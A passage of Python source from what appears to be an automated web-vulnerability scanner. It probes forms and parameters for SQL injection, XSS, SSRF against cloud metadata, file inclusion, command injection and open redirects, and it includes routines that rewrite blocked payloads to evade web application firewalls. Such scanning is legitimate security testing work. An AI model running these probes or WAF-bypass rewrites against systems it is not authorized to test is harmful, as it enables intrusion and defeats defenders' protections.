    def _snippet(text: str, match: str | re.Match[str] | None, width: int = 200) -> str:
        if text is None:
            return ""
        try:
            if isinstance(match, re.Match):
                start, end = match.start(), match.end()
            elif isinstance(match, str) and match:
                idx = text.find(match)
                if idx < 0:
                    return text[:width].replace("\n", " ").replace("\r", " ")
                start, end = idx, idx + len(match)
            else:
                return text[:width].replace("\n", " ").replace("\r", " ")
            lo = max(0, start - width // 2)
            hi = min(len(text), end + width // 2)
            return text[lo:hi].replace("\n", " ").replace("\r", " ").strip()
        except Exception:
            return str(text[:width])

    def _note_waf(self, resp: httpx.Response) -> None:
        self._waf_count += 1
        if not self._waf_evidence:
            try:
                body = resp.text[:300]
            except Exception:
                body = ""
            self._waf_evidence = f"HTTP {resp.status_code} on probe: {body}"

    def _waf_blocked(self, resp: httpx.Response, baseline_text: str | None) -> bool:
        if resp.status_code in WAF_STATUSES:
            return True
        try:
            text = resp.text[:8000]
        except Exception:
            return False
        for pattern in _WAF_SIG_RE:
            if pattern.search(text):
                if baseline_text and pattern.search(baseline_text):
                    continue
                return True
        return False

    @staticmethod
    def _mixed_case(payload: str) -> str:
        """Alternate keyword letter case (classic WAF bypass)."""

        def _flip(mo: re.Match[str]) -> str:
            word = mo.group(0)
            return "".join(c.lower() if i % 2 else c.upper() for i, c in enumerate(word))

        if not any(kw in payload.upper() for kw in _SQL_KEYWORDS):
            return payload
        pattern = "|".join(re.escape(k) for k in sorted(_SQL_KEYWORDS, key=len, reverse=True))
        return re.sub(pattern, _flip, payload, flags=re.IGNORECASE)

    @staticmethod
    def _double_encode(payload: str) -> str:
        specials = set("'\"<>()#;`|&$\\ ")
        return "".join(f"%{ord(c):02x}" if c in specials else c for c in payload)

    @staticmethod
    def _json_escape(payload: str) -> str:
        return payload.replace("<", "\\u003c").replace(">", "\\u003e").replace("'", "\\u0027")

    def _bypass_variants(self, payload: str) -> list[str]:
        """Return obfuscated rewrites of *payload* for WAF-bypass retries."""
        variants: list[str] = []
        encoded = self._double_encode(payload)
        if encoded != payload:
            variants.append(encoded)
        cased = self._mixed_case(payload)
        if cased != payload:
            variants.append(cased)
        if " " in payload:
            variants.append(payload.replace(" ", "/**/"))
            variants.append(payload.replace(" ", "\t"))
            variants.append(payload.replace(" ", "\n"))
        if "<" in payload:
            escaped = self._json_escape(payload)
            if escaped != payload:
                variants.append(escaped)
            variants.append(payload.replace("<", "\\x3c").replace(">", "\\x3e"))
            if "=" in payload:
                variants.append(payload.replace("=", "&#x3d;"))
                variants.append(payload.replace("=", "&#61;"))
        return variants

    def _safe_predicate(
        self,
        predicate: Callable[[httpx.Response, str], str | None],
        resp: httpx.Response,
        payload: str,
    ) -> str | None:
        try:
            return predicate(resp, payload)
        except Exception:
            return None

    # ------------------------------------------------------------------ #
    # Request helpers
    # ------------------------------------------------------------------ #

    async def _send(
        self,
        client: httpx.AsyncClient,
        point: InjectionPoint,
        payload: str,
    ) -> tuple[httpx.Response | None, float]:
        """Send *payload* in *point*'s parameter. Returns (response, elapsed)."""
        if self._past_deadline():
            return None, 0.0
        self._requests += 1
        t0 = time.monotonic()
        try:
            async with self._sem:
                if point.method == "POST":
                    data = {**point.base_data, point.param: payload}
                    resp = await client.post(point.url, data=data)
                else:
                    params = {**point.base_data, point.param: payload}
                    resp = await client.get(point.url, params=params)
            return resp, time.monotonic() - t0
        except (httpx.HTTPError, OSError, ValueError):
            return None, time.monotonic() - t0
        except asyncio.CancelledError:
            raise
        except Exception:
            return None, 0.0

    async def _baseline(self, client: httpx.AsyncClient, point: InjectionPoint) -> None:
        """Fetch and cache the unmodified response for *point*."""
        key = point.key
        if key in self._baselines:
            return
        resp, elapsed = await self._send(client, point, BASELINE_VALUE)
        self._baselines[key] = resp
        self._baseline_times[key] = elapsed

    async def _baselines_for(
        self, client: httpx.AsyncClient, points: Sequence[InjectionPoint]
    ) -> None:
        missing = [p for p in points if p.key not in self._baselines]
        if missing:
            await asyncio.gather(*(self._baseline(client, p) for p in missing))

    def _baseline_text(self, point: InjectionPoint) -> str:
        resp = self._baselines.get(point.key)
        if resp is None:
            return ""
        try:
            return resp.text
        except Exception:
            return ""

    async def _first_hit(
        self,
        client: httpx.AsyncClient,
        point: InjectionPoint,
        payloads: Sequence[str],
        predicate: Callable[[httpx.Response, str], str | None],
    ) -> tuple[str, httpx.Response, str] | None:
        """Probe *payloads* in chunks; return the first (payload, resp, evidence).

        Stops early on the first detection and retries blocked probes with
        WAF-bypass variants of the payload.
        """
        baseline_text = self._baseline_text(point)
        bypass_used = 0
        for i in range(0, len(payloads), self.CHUNK):
            if self._past_deadline():
                return None
            batch = payloads[i : i + self.CHUNK]
            responses = await asyncio.gather(*(self._send(client, point, p) for p in batch))
            for payload, (resp, _elapsed) in zip(batch, responses):
                if resp is None:
                    continue
                ev = self._safe_predicate(predicate, resp, payload)
                if ev:
                    return payload, resp, ev
                if bypass_used < 2 and self._waf_blocked(resp, baseline_text):
                    bypass_used += 1
                    self._note_waf(resp)
                    for variant in self._bypass_variants(payload)[:4]:
                        if self._past_deadline():
                            break
                        vresp, _ = await self._send(client, point, variant)
                        if vresp is None:
                            continue
                        if self._waf_blocked(vresp, baseline_text):
                            self._note_waf(vresp)
                            continue
                        ev = self._safe_predicate(predicate, vresp, variant)
                        if ev:
                            return variant, vresp, ev
        return None

    # ------------------------------------------------------------------ #
    # Parameter discovery
    # ------------------------------------------------------------------ #

    async def _discover(self, client: httpx.AsyncClient, target: str) -> list[InjectionPoint]:
        points: list[InjectionPoint] = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"

        # 1. Parameters already present in the target query string.
        if parsed.query:
            query = parse_qsl(parsed.query, keep_blank_values=True)
            for name, _value in query:
                others = {k: v for k, v in query if k != name}
                points.append(InjectionPoint("GET", base_url, name, others, source="query"))

        # 2. Parameters from HTML forms on the page.
        if not self._past_deadline():
            try:
                async with self._sem:
                    resp = await client.get(target)
            except Exception:
                resp = None
            if resp is not None:
                try:
                    body = resp.text[:400_000]
                except Exception:
                    body = ""
                if "<form" in body.lower():
                    parser = _FormParser()
                    try:
                        parser.feed(body)
                    except Exception:
                        pass
                    page_url = str(resp.url)
                    for form in parser.forms[:8]:
                        action = urljoin(page_url, form["action"]) if form["action"] else page_url
                        method = form["method"] if form["method"] in ("GET", "POST") else "GET"
                        fields = list(form["fields"].items())[:12]
                        if not fields:
                            fields = [("data", "1")]
                        for name, value in fields:
                            others = {k: v for k, v in fields if k != name}
                            points.append(InjectionPoint(method, action, name, others, source="form"))

        # 3. Always add a fallback sweep of common parameter names so hidden
        #    (non-form) endpoints and AJAX-style parameters still get tested.
        points.extend(self._fallback_points(target))
        return points

    @staticmethod
    def _fallback_points(target: str) -> list[InjectionPoint]:
        points = [
            InjectionPoint("GET", target, name, {}, source="common")
            for name in COMMON_PARAMS
        ]
        # Synthetic POST points catch APIs / comment forms with no visible form.
        for name in ("comment", "message", "url", "q", "file", "cmd", "redirect"):
            points.append(InjectionPoint("POST", target, name, {}, source="common"))
        return points

    @staticmethod
    def _dedupe(points: Sequence[InjectionPoint]) -> list[InjectionPoint]:
        seen: set[tuple[str, str, str]] = set()
        unique: list[InjectionPoint] = []
        for point in points:
            if point.key in seen:
                continue
            seen.add(point.key)
            unique.append(point)
        return unique

    def _select_points(
        self, points: Sequence[InjectionPoint], vuln: str, limit: int | None = None
    ) -> list[InjectionPoint]:
        """Rank injection points by relevance for *vuln* and cap the count."""
        hints = set(PARAM_HINTS.get(vuln, ()))

        def score(point: InjectionPoint) -> int:
            s = 0
            if point.param.lower() in hints:
                s += 4
            elif any(h in point.param.lower() for h in hints if len(h) > 3):
                s += 2
            if point.source == "query":
                s += 2
            elif point.source == "form":
                s += 3
            return s

        ranked = sorted(points, key=score, reverse=True)  # stable sort
        return ranked[: limit or self.MAX_POINTS_PER_TEST]

    # ------------------------------------------------------------------ #
    # Detection predicates
    # ------------------------------------------------------------------ #

    def _sql_error_evidence(self, resp: httpx.Response, baseline_text: str) -> str | None:
        try:
            text = resp.text
        except Exception:
            return None
        for pattern in _SQL_ERROR_RE:
            match = pattern.search(text)
            if match:
                if baseline_text and pattern.search(baseline_text):
                    continue
                return f"SQL error signature {match.group(0)!r} -> {self._snippet(text, match)}"
        if resp.status_code >= 500 and baseline_text is not None:
            weak = re.search(
                r"\b(sql|query|database|mysql|pdo|sqlite|oracle|jdbc)\b", text, re.I
            )
            if weak and not re.search(r"\b(sql|query|database|mysql|pdo)\b", baseline_text, re.I):
                return f"HTTP {resp.status_code} with database error text -> {self._snippet(text, weak)}"
        return None

    def _reflected_xss_evidence(
        self, resp: httpx.Response, payload: str, baseline_text: str
    ) -> str | None:
        try:
            text = resp.text
        except Exception:
            return None
        if baseline_text and payload in baseline_text:
            return None  # payload pre-exists on the page - not our injection
        if payload.startswith(("javascript:", "JaVaScRiPt:", "data:")):
            pattern = re.compile(
                r"(?:href|src|action|formaction|background)\s*=\s*[\"']?[^\"'>\s]*"
                + re.escape(payload.split(":")[0]),
                re.I,
            )
            match = pattern.search(text)
            if match and payload.lower() in text.lower():
                return f"raw reflection in URL attribute -> {self._snippet(text, payload)}"
            return None
        if payload in text:
            return f"payload reflected unencoded -> {self._snippet(text, payload)}"
        # Attribute-breakout case: tag/event part reflected without encoding.
        marker = re.search(r"onerror\s*=\s*alert|onload\s*=\s*alert|<script>alert", text, re.I)
        if marker and re.search(r"<script|onerror|onload", payload, re.I):
            return f"event-handler/script context reflected -> {self._snippet(text, marker)}"
        return None

    def _ssrf_evidence(self, resp: httpx.Response, baseline_text: str) -> str | None:
        try:
            text = resp.text
        except Exception:
            return None
        for pattern in _SSRF_SIG_RE:
            match = pattern.search(text)
            if match:
                if baseline_text and pattern.search(baseline_text):
                    continue
                return f"internal service fingerprint {match.group(0)!r} -> {self._snippet(text, match)}"
        return None

    def _file_evidence(
        self, resp: httpx.Response, payload: str, baseline_text: str
    ) -> str | None:
        try:
            text = resp.text
        except Exception:
            return None
        for pattern in _FILE_SIG_RE:
            match = pattern.search(text)
            if match:
                if baseline_text and pattern.search(baseline_text):
                    continue
                return f"file content signature {match.group(0)!r} -> {self._snippet(text, match)}"
        # php://filter style payloads: try to base64-decode embedded blobs.
        if "base64" in payload:
            for blob in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", text):
                try:
                    decoded = base64.b64decode(blob + "=" * (-len(blob) % 4)).decode(
                        "utf-8", "replace"
                    )
                except Exception:
                    continue
                if "<?php" in decoded or "root:x:0:0" in decoded:
                    return f"base64-decoded wrapper output -> {decoded[:160]!r}"
        return None

    def _rce_evidence(
        self, resp: httpx.Response, payload: str, baseline_text: str
    ) -> str | None:
        try:
            text = resp.text
        except Exception:
            return None
        for pattern in _RCE_DUMP_RE:
            match = pattern.search(text)
            if match:
                if baseline_text and pattern.search(baseline_text):
                    continue
                if match.group(0) == MATH_MARKER:
                    return f"expression evaluated: 1234*5678 = {MATH_MARKER} -> {self._snippet(text, match)}"
                return f"code/template execution evidence {match.group(0)!r} -> {self._snippet(text, match)}"
        for pattern in _CMD_SIG_RE:
            match = pattern.search(text)
            if match:
                if baseline_text and pattern.search(baseline_text):
                    continue
                return f"command output {match.group(0)!r} -> {self._snippet(text, match)}"
        return None

    def _cmdi_evidence(
        self, resp: httpx.Response, payload: str, baseline_text: str
    ) -> str | None:
        try:
            text = resp.text
        except Exception:
            return None
        for pattern in _CMD_SIG_RE:
            match = pattern.search(text)
            if match:
                if baseline_text and pattern.search(baseline_text):
                    continue
                return f"command output {match.group(0)!r} -> {self._snippet(text, match)}"
        return None

    def _redirect_evidence(self, resp: httpx.Response, payload: str) -> str | None:
        marker = REDIRECT_MARKER.lower()
        location = resp.headers.get("location", "")
        if location and marker in location.lower():
            return f"HTTP {resp.status_code} Location: {location}"
        try:
            text = resp.text
        except Exception:
            return None
        low = text.lower()
        idx = low.find(marker)
        while idx != -1:
            context = low[max(0, idx - 160) : idx]
            if any(
                token in context
                for token in ("location", "refresh", "window.open", "navigate", "replace", "assign")
            ):
                return f"redirect marker in script/meta context -> {self._snippet(text, idx)}"
            idx = low.find(marker, idx + 1)
        if payload.startswith(("javascript:", "data:")) and payload.lower() in low:
            if re.search(r"location|refresh|window\.open", low):
                return f"dangerous redirect scheme reflected -> {self._snippet(text, payload)}"
        return None

    # ------------------------------------------------------------------ #
    # Vulnerability tests
    # ------------------------------------------------------------------ #

    def _make_finding(
        self,
        *,
        title: str,
        severity: Severity,
        point: InjectionPoint,
        payload: str,
        resp: httpx.Response | None,
        evidence: str,
        vuln: str,
        cvss: float | None = None,
        verified: bool = True,
        extra_metadata: dict | None = None,
    ) -> Finding:
        status = resp.status_code if resp is not None else "?"
        metadata = {
            "vuln_type": vuln,
            "method": point.method,
            "param": point.param,
            "payload": payload,
            "status": status,
        }
        if extra_metadata:
            metadata.update(extra_metadata)
        return Finding(
            title=title,
            severity=severity,
            target=point.url,
            evidence=(
                f"[{point.method} {point.url} param={point.param!r}] "
                f"payload={payload!r} -> HTTP {status}: {evidence}"
            ),
            remediation=REMEDIATIONS.get(vuln, ""),
            scanner=self.name,
            cvss=cvss,
            verified=verified,
            metadata=metadata,
        )

    async def _test_sqli(
        self, client: httpx.AsyncClient, points: Sequence[InjectionPoint]
    ) -> list[Finding]:
        findings: list[Finding] = []
        selected = self._select_points(points, "sqli")
        await self._baselines_for(client, selected)
        confirmed: set[tuple[str, str, str]] = set()

        # Phase 1: error-based detection.
        async def error_pass(point: InjectionPoint) -> Finding | None:
            baseline = self._baseline_text(point)
            hit = await self._first_hit(
                client,
                point,
                SQLI_ERROR_PAYLOADS,
                lambda r, p: self._sql_error_evidence(r, baseline),
            )
            if not hit:
                return None
            payload, resp, ev = hit
            return self._make_finding(
                title="SQL injection (error-based)",
                severity=Severity.CRITICAL,
                point=point,
                payload=payload,
                resp=resp,
                evidence=ev,
                vuln="sqli",
                cvss=9.8,
            )

        results = await asyncio.gather(*(error_pass(p) for p in selected))
        for finding in results:
            if finding:
                findings.append(finding)
                confirmed.add(
                    (finding.metadata["method"], finding.target, finding.metadata["param"])
                )

        remaining = [p for p in selected if p.key not in confirmed and not self._past_deadline()]

        # Phase 2: boolean-blind differential detection.
        async def boolean_pass(point: InjectionPoint) -> Finding | None:
            baseline = self._baseline_text(point)
            for true_p, false_p in SQLI_BOOLEAN_PAIRS:
                if self._past_deadline():
                    return None
                (rt, _et), (rf, _ef) = await asyncio.gather(
                    self._send(client, point, true_p),
                    self._send(client, point, false_p),
                )
                if rt is None or rf is None:
                    continue
                if self._waf_blocked(rt, baseline) or self._waf_blocked(rf, baseline):
                    self._note_waf(rt if self._waf_blocked(rt, baseline) else rf)
                    continue
                if rt.status_code == rf.status_code == 200 or (
                    rt.status_code == 200 and rf.status_code in (200, 404, 500)
                ):
                    len_t, len_f = len(rt.text), len(rf.text)
                    diff = abs(len_t - len_f)
                    rel = diff / max(min(len_t, len_f), 1)
                    if diff >= 60 and rel >= 0.10:
                        return self._make_finding(
                            title="SQL injection (boolean blind)",
                            severity=Severity.CRITICAL,
                            point=point,
                            payload=f"{true_p!r} vs {false_p!r}",
                            resp=rt,
                            evidence=(
                                f"true condition returned {len_t} bytes, false condition "
                                f"returned {len_f} bytes (diff {diff} bytes / {rel:.0%}) "
                                f"-> {self._snippet(rt.text, None, 120)!r}"
                            ),
                            vuln="sqli",
                            cvss=9.1,
                            verified=False,
                        )
            return None

        if remaining and not self._past_deadline():
            results = await asyncio.gather(*(boolean_pass(p) for p in remaining))
            for finding in results:
                if finding:
                    findings.append(finding)
                    confirmed.add((finding.metadata["method"], finding.target, finding.metadata["param"]))

        # Phase 3: time-based blind detection.
        remaining = [p for p in remaining if p.key not in confirmed][:3]
        if remaining and self._remaining() > self.TIME_SLEEP + 4.0:
            results = await asyncio.gather(
                *(self._time_based(client, p, SQLI_TIME_PAYLOADS, "sqli") for p in remaining)
            )
            for finding in results:
                if finding:
                    findings.append(finding)
        return findings

    async def _time_based(
        self,
        client: httpx.AsyncClient,
        point: InjectionPoint,
        payloads: Sequence[str],
        vuln: str,
    ) -> Finding | None:
        """Send sleeping payloads; flag the point if responses stall as expected."""
        baseline_time = self._baseline_times.get(point.key)
        if baseline_time is None or baseline_time > 1.2:
            return None
        if self._remaining() < self.TIME_SLEEP + 3.0:
            return None

        async def one(payload: str) -> tuple[str, httpx.Response | None, float]:
            if self._past_deadline():
                return payload, None, 0.0
            resp, elapsed = await self._send(client, point, payload)
            return payload, resp, elapsed

        results = await asyncio.gather(*(one(p) for p in payloads))
        threshold = max(baseline_time + self.TIME_SLEEP * 0.8, self.TIME_SLEEP * 0.85)
        baseline_text = self._baseline_text(point)
        for payload, resp, elapsed in results:
            if resp is None:
                continue
            if self._waf_blocked(resp, baseline_text):
                self._note_waf(resp)
                continue
            if elapsed >= threshold:
                titles = {
                    "sqli": "SQL injection (time-based blind)",
                    "cmdi": "Command injection (time-based blind)",
                }
                return self._make_finding(
                    title=titles.get(vuln, "Time-based blind injection"),
                    severity=Severity.CRITICAL,
                    point=point,
                    payload=payload,
                    resp=resp,
                    evidence=(
                        f"response delayed {elapsed:.2f}s "
                        f"(baseline {baseline_time:.2f}s, threshold {threshold:.2f}s)"
                    ),
                    vuln=vuln,
                    cvss=9.1,
                )
        return None

    async def _test_xss(
        self, client: httpx.AsyncClient, points: Sequence[InjectionPoint]
    ) -> list[Finding]:
        findings: list[Finding] = []
        selected = self._select_points(points, "xss")
        await self._baselines_for(client, selected)

        async def pass_point(point: InjectionPoint) -> Finding | None:
            baseline = self._baseline_text(point)
            hit = await self._first_hit(
                client,
                point,
                XSS_PAYLOADS,
                lambda r, p: self._reflected_xss_evidence(r, p, baseline),
            )
            if not hit:
                return None
            payload, resp, ev = hit
            return self._make_finding(
                title="Cross-site scripting (reflected)",
                severity=Severity.MEDIUM,
                point=point,
                payload=payload,
                resp=resp,
                evidence=ev,
                vuln="xss_reflected",
                cvss=6.1,
            )

        results = await asyncio.gather(*(pass_point(p) for p in selected))
        findings.extend(f for f in results if f)
        return findings

    async def _test_stored_xss(
        self, client: httpx.AsyncClient, points: Sequence[InjectionPoint]
    ) -> list[Finding]:
        findings: list[Finding] = []
        post_points = [p for p in points if p.method == "POST"][:3]
        if not post_points:
            return findings

        marker = f"SPECTRE_STORED_{uuid.uuid4().hex[:10]}"
        submitted: list[tuple[InjectionPoint, str]] = []
        for index, point in enumerate(post_points):
            if self._past_deadline():
                break
            payload = STORED_XSS_PAYLOAD_TEMPLATES[index % len(STORED_XSS_PAYLOAD_TEMPLATES)].format(
                marker=marker
            )
            resp, _ = await self._send(client, point, payload)
            if resp is None:
                continue
            baseline = self._baseline_text(point)
            if self._waf_blocked(resp, baseline):
                self._note_waf(resp)
                continue
            submitted.append((point, payload))

        if not submitted:
            return findings

        # Give the application a moment to persist the payload, then re-fetch
        # the page *without* the payload to prove persistence across requests.
        if self._remaining() > 8.0:
            await asyncio.sleep(0.4)

        for point, payload in submitted:
            if self._past_deadline():
                break
            # Re-fetch the page *without* the payload to prove the payload
            # persists across requests. Prefer a plain GET so we do not
            # overwrite what we are trying to detect; only fall back to a
            # POST of the remaining (payload-free) fields when necessary.
            refetch = await self._refetch_clean(client, point, marker)
            if refetch is None:
                continue
            resp, text = refetch
            if marker in text and payload in text:
                findings.append(
                    self._make_finding(
                        title="Cross-site scripting (stored)",
                        severity=Severity.HIGH,
                        point=point,
                        payload=payload,
                        resp=resp,
                        evidence=(
                            f"payload persisted: marker {marker!r} still present on a clean "
                            f"re-fetch of {point.url} -> {self._snippet(text, payload)}"
                        ),
                        vuln="xss_stored",
                        cvss=6.4,
                    )
                )
            elif marker in text:
                findings.append(
                    self._make_finding(
                        title="Cross-site scripting (stored, partially filtered)",
                        severity=Severity.MEDIUM,
                        point=point,
                        payload=payload,
                        resp=resp,
                        evidence=(
                            f"marker {marker!r} persisted on re-fetch but payload was modified "
                            f"-> {self._snippet(text, marker)}"
                        ),
                        vuln="xss_stored",
                        cvss=5.4,
                        verified=False,
                    )
                )
        return findings

    async def _refetch_clean(
        self, client: httpx.AsyncClient, point: InjectionPoint, marker: str
    ) -> tuple[httpx.Response, str] | None:
        """Fetch *point*'s page again without the payload parameter.

        A plain GET is preferred so the original submission is not
        overwritten; the original POST (minus the payload field) is only
        retried when the GET response does not contain the marker.
        """
        get_resp: httpx.Response | None
        try:
            async with self._sem:
                get_resp = await client.get(point.url, params=point.base_data or None)
        except Exception:
            get_resp = None
        if get_resp is not None:
            try:
                if marker in get_resp.text:
                    return get_resp, get_resp.text
            except Exception:
                pass
        if point.base_data:
            # Some apps only render stored content through the original POST.
            try:
                async with self._sem:
                    post_resp = await client.post(point.url, data=point.base_data)
            except Exception:
                post_resp = None
            if post_resp is not None:
                try:
                    if marker in post_resp.text:
                        return post_resp, post_resp.text
                except Exception:
                    pass
        if get_resp is not None:
            try:
                return get_resp, get_resp.text
            except Exception:
                return None
        return None

    async def _test_ssrf(
        self, client: httpx.AsyncClient, points: Sequence[InjectionPoint]
    ) -> list[Finding]:
        findings: list[Finding] = []
        selected = self._select_points(points, "ssrf")
        await self._baselines_for(client, selected)

        async def pass_point(point: InjectionPoint) -> Finding | None:
            baseline = self._baseline_text(point)
            hit = await self._first_hit(
                client,
                point,
                SSRF_PAYLOADS,
                lambda r, p: self._ssrf_evidence(r, baseline),
            )
            if not hit:
                return None
            payload, resp, ev = hit
            critical = any(
                marker in payload
                for marker in ("169.254.169.254", "metadata.google.internal", "metadata/instance")
            )
            return self._make_finding(
                title="Server-side request forgery (cloud metadata reachable)"
                if critical
                else "Server-side request forgery",
                severity=Severity.CRITICAL if critical else Severity.HIGH,
                point=point,
                payload=payload,
                resp=resp,
                evidence=ev,
                vuln="ssrf",
                cvss=9.8 if critical else 8.6,
            )

        results = await asyncio.gather(*(pass_point(p) for p in selected))
        findings.extend(f for f in results if f)
        return findings

    async def _test_lfi(
        self, client: httpx.AsyncClient, points: Sequence[InjectionPoint]
    ) -> list[Finding]:
        findings: list[Finding] = []
        selected = self._select_points(points, "lfi")
        await self._baselines_for(client, selected)

        async def pass_point(point: InjectionPoint) -> Finding | None:
            baseline = self._baseline_text(point)
            hit = await self._first_hit(
                client,
                point,
                LFI_PAYLOADS,
                lambda r, p: self._file_evidence(r, p, baseline),
            )
            if not hit:
                return None
            payload, resp, ev = hit
            return self._make_finding(
                title="Local file inclusion / arbitrary file read",
                severity=Severity.HIGH,
                point=point,
                payload=payload,
                resp=resp,
                evidence=ev,
                vuln="lfi",
                cvss=7.5,
            )

        results = await asyncio.gather(*(pass_point(p) for p in selected))
        findings.extend(f for f in results if f)
        return findings

    async def _test_traversal(
        self, client: httpx.AsyncClient, points: Sequence[InjectionPoint]
    ) -> list[Finding]:
        findings: list[Finding] = []
        selected = self._select_points(points, "traversal")
        await self._baselines_for(client, selected)

        async def pass_point(point: InjectionPoint) -> Finding | None:
            baseline = self._baseline_text(point)
            hit = await self._first_hit(
                client,
                point,
                TRAVERSAL_PAYLOADS,
                lambda r, p: self._file_evidence(r, p, baseline),
            )
            if not hit:
                return None
            payload, resp, ev = hit
            return self._make_finding(
                title="Path traversal",
                severity=Severity.HIGH,
                point=point,
                payload=payload,
                resp=resp,
                evidence=ev,
                vuln="traversal",
                cvss=7.5,
            )

        results = await asyncio.gather(*(pass_point(p) for p in selected))
        findings.extend(f for f in results if f)
        return findings

    async def _test_rce(
        self, client: httpx.AsyncClient, points: Sequence[InjectionPoint]
    ) -> list[Finding]:
        findings: list[Finding] = []
        selected = self._select_points(points, "rce")
        await self._baselines_for(client, selected)

        async def pass_point(point: InjectionPoint) -> Finding | None:
            baseline = self._baseline_text(point)
            hit = await self._first_hit(
                client,
                point,
                RCE_PAYLOADS,
                lambda r, p: self._rce_evidence(r, p, baseline),
            )
            if not hit:
                return None
            payload, resp, ev = hit
            return self._make_finding(
                title="Remote code execution / server-side template injection",
                severity=Severity.CRITICAL,
                point=point,
                payload=payload,
                resp=resp,
                evidence=ev,
                vuln="rce",
                cvss=9.8,
            )

        results = await asyncio.gather(*(pass_point(p) for p in selected))
        findings.extend(f for f in results if f)
        return findings

    async def _test_cmdi(
        self, client: httpx.AsyncClient, points: Sequence[InjectionPoint]
    ) -> list[Finding]:
        findings: list[Finding] = []
        selected = self._select_points(points, "cmdi")
        await self._baselines_for(client, selected)
        confirmed: set[tuple[str, str, str]] = set()

        async def output_pass(point: InjectionPoint) -> Finding | None:
            baseline = self._baseline_text(point)
            hit = await self._first_hit(
                client,
                point,
                CMDI_PAYLOADS,
                lambda r, p: self._cmdi_evidence(r, p, baseline),
            )
            if not hit:
                return None
            payload, resp, ev = hit
            return self._make_finding(
                title="Command injection (output-based)",
                severity=Severity.CRITICAL,
                point=point,
                payload=payload,
                resp=resp,
                evidence=ev,
                vuln="cmdi",
                cvss=9.8,
            )

        results = await asyncio.gather(*(output_pass(p) for p in selected))
        for finding in results:
            if finding:
                findings.append(finding)
                confirmed.add((finding.metadata["method"], finding.target, finding.metadata["param"]))

        remaining = [p for p in selected if p.key not in confirmed][:3]
        if remaining and self._remaining() > self.TIME_SLEEP + 4.0:
            results = await asyncio.gather(
                *(self._time_based(client, p, CMDI_TIME_PAYLOADS, "cmdi") for p in remaining)
            )
            for finding in results:
                if finding:
                    findings.append(finding)
        return findings

    async def _test_open_redirect(
        self, client: httpx.AsyncClient, points: Sequence[InjectionPoint]
    ) -> list[Finding]:
        findings: list[Finding] = []
        selected = self._select_points(points, "redirect", limit=8)

        async def pass_point(point: InjectionPoint) -> list[Finding]:
            local: list[Finding] = []
            hit = await self._first_hit(
                client,
                point,
                REDIRECT_PAYLOADS,
                lambda r, p: self._redirect_evidence(r, p),
            )
            if hit:
                payload, resp, ev = hit
                severity = (
                    Severity.MEDIUM
                    if payload.lower().startswith(("javascript:", "data:"))
                    else Severity.LOW
                )
                local.append(
                    self._make_finding(
                        title="Open redirect",
                        severity=severity,
                        point=point,
                        payload=payload,
                        resp=resp,
                        evidence=ev,
                        vuln="redirect",
                        cvss=6.1 if severity == Severity.MEDIUM else 4.7,
                    )
                )
            return local

        results = await asyncio.gather(*(pass_point(p) for p in selected))
        for batch in results:
            findings.extend(batch)
        return findings
